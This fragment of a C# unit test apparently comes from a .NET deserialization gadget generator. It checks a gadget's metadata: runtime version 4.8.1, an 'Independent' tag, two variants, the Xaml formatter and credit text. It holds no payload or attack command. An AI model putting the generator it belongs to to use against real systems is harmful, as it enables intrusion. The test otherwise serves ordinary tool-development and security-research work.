                "a runtime-gated gadget names at least one working version");
            AssertTrue(facets.Versions.Contains(RuntimeVersion.NetFx481),
                "4.8.1 is the build the timestamp write is observed on");

            AssertTrue(gen.Labels().Contains(GadgetTags.Independent),
                "an independent gadget: it owns its whole chain");
            AssertEqual(2, gen.Variants().Count, "two carriers, so two variants");
            AssertTrue(!string.IsNullOrEmpty(gen.AdditionalInfo()), "it explains itself");
            AssertTrue(gen.AdditionalInfo().Length < 200,
                "briefly, so the interactive info panel still shows the formatter and category lines");
            AssertTrue(!string.IsNullOrEmpty(gen.Finders()), "the credit is filled in");

            // Neither variant narrows the formatter list, so neither overrides the facets.
            foreach (GadgetVariant v in gen.Variants())
            {
                AssertTrue(v.SupportsFormatter(Formatters.Xaml),
                    "variant " + v.Number + " keeps the one advertised formatter");
                AssertTrue(v.FacetOverride == null,
                    "variant " + v.Number + " inherits the gadget's facets");
            }
        }
    }
}
